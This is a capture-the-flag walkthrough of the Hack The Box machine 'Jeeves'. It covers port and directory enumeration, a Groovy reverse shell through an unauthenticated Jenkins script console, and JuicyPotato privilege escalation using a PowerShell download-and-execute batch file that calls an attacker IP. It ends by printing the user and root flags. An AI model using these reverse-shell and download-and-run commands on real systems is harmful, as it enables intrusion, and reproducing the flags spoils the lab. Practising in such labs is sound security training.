# Jeeves - Medium

```shell
nmap -T4 -p- -A -v 10.10.10.63

feroxbuster -u http://10.10.10.63 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,bak,js,txt,json,docx,pdf,zip --extract-links --scan-limit 2 --filter-status 401,403,404,405,500 --silent

feroxbuster -u http://10.10.10.63:50000 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,bak,js,txt,json,docx,pdf,zip --extract-links --scan-limit 2 --filter-status 401,403,404,405,500 --silent

nc -nvlp 4444
#setup listener for groovy script exploit
#we get reverse shell

whoami

whoami /priv
#SeImpersonatePrivilege enabled

#download JuicyPotato.exe in attacker machine
#setup server in attacker machine
python3 -m http.server

#transfer exploit and nc.exe
#in victim machine
#certutil is not available
powershell -c (New-Object Net.WebClient).DownloadFile('http://10.10.14.2:8000/JuicyPotato.exe', 'jp.exe')

.\jp.exe
#check required arguments

#in attacker machine
#add reverse-shell oneliner at end of Invoke-PowerShellTcp.ps1 script
vim Invoke-PowerShellTcp.ps1

echo "powershell -c iex(new-object net.webclient).downloadstring('http://10.10.14.2:8000/Invoke-PowerShellTcp.ps1')" > shell.bat

#now in victim machine
powershell -c (New-Object Net.WebClient).DownloadFile('http://10.10.14.2:8000/shell.bat', 'shell.bat')

#setup listener in attacker machine
nc -nvlp 6666

#in victim machine
#run juicy potato exploit
.\jp.exe -t * -p shell.bat -l 4444

#we get powershell shell as System on our listener
whoami

type C:\Users\kohsuke\Desktop\user.txt

cd C:\Users\Administrator\Desktop

dir
#we do not have root.txt

type hm.txt
#we've to go deeper

cmd /r dir /R
#dir /R is actual command to show alternate data streams
#as we are in powershell
#this shows us hidden data stream

Get-Item -path hm.txt -stream *
#gives stream name

Get-Content -path hm.txt -stream root.txt
#root flag
```

```groovy
String host="10.10.14.2";
int port=4444;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

* Open ports & services:

  * 80 - http - Microsoft IIS httpd 10.0
  * 135 - msrpc - RPC
  * 445 - microsoft-ds - Microsoft Windows 7-10 microsoft-ds
  * 50000 - http - Jetty 9.4.z-SNAPSHOT

* The webpage on port 80 leads us to a page for 'Ask Jeeves'; when we search for anything, we are shown an image of an error page.

* There is a webpage on port 50000 as well, but it also shows an error along with the software used - 'Jetty 9.4.z-SNAPSHOT'.

* We can enumerate web directories for both ports to check for any hidden directories.

* On port 50000, we get the page /askjeeves, which leads us to a Jenkins dashboard without any login required.

* The Jenkins version is 2.87; we can find some exploits for this version on Google.

* We can attempt to exploit the Jenkins Groovy script feature; if we setup listener and execute the script in /askjeeves/script, we will get reverse shell as kohsuke.

* Now, checking privileges, we can see that SeImpersonatePrivilege is enabled.

* We can use Juicy Potato exploit to abuse this privilege; we can get the .exe for the exploit from the official repo.

* We can use Invoke-PowerShellTcp.ps1 script to get reverse shell; add the following line to the end of the script:

    ```Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.2 -Port 6666```

* Next, we need to create a shell.bat file that downloads the reverse shell script and runs it.

* Lastly, we need to transfer this shell.bat file to the victim machine, and then run it with Juicy Potato exploit.

* On the listener which we have setup, we get shell as System.

* We do not have root.txt in Administrator's desktop; but we get alternate data stream upon checking.

* Therefore we can get root flag by using alternate data stream.

```markdown
1. User flag - e3232272596fb47950d59c4cf1e7066a

2. Root flag - afbc5bd4b615a60648cec41c6ac92530
```
